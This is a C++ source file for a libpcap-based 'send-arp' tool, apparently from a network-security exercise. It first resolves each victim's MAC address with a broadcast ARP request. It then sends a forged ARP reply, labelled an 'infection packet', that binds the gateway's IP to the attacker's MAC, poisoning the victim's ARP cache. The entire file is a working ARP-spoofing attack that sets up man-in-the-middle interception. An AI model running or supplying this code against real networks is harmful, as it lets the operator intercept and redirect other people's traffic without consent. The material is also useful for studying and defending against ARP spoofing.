#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMacAddr(const char* interface, uint8_t* mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("socket() FAILED\n");
		return -1;
	}

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("ioctl() FAILED\n");
		close(sockfd);
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6); // mac addr len
	close(sockfd);

	return 0;
}

void debug(int a){
	printf("%dth point\n", a);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	/* Get mac addr (Attacker) */
	uint8_t mac_addr[6] = {0};
	GetMacAddr(dev, mac_addr);
	EthArpPacket packet;

	unsigned int count = argc / 2 - 1;

	for(int i = 1; i < count + 1; i++){

		Ip sender_ip = Ip(argv[2 * i]);
		Ip receiver_ip = Ip(argv[2 * i + 1]);

		/* ARP request to get mac addr */
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(mac_addr);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(mac_addr);
		packet.arp_.sip_ = htonl(Ip("0.0.0.0")); // my ip ?
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(sender_ip); // sender

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		/* receive packets */
		struct pcap_pkthdr* header;
		const u_char* rcvpacket;
		PEthHdr ethernet_hdr;
		PArpHdr arp_hdr;
		while(true){ 
			int res = pcap_next_ex(handle, &header, &rcvpacket);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			/* Get eth header */
			ethernet_hdr = (PEthHdr)rcvpacket;
			uint16_t eth_type = ethernet_hdr->type();
			if(eth_type == EthHdr::Arp){
				/* Get ARP header */
				rcvpacket += sizeof(struct EthHdr);
				arp_hdr = (PArpHdr)rcvpacket;
				if(arp_hdr->sip() == sender_ip) break;
			}
		}
		Mac sender_mac = arp_hdr->smac();
		
		/* Send ARP infection packet */
		packet.eth_.dmac_ = sender_mac; // sender
		packet.eth_.smac_ = Mac(mac_addr); // me
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply); // reply! 
		packet.arp_.smac_ = Mac(mac_addr);  // me
		packet.arp_.sip_ = htonl(receiver_ip); // gateway
		packet.arp_.tmac_ = sender_mac;
		packet.arp_.tip_ = htonl(sender_ip); // sender

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

	}

	pcap_close(handle);
}
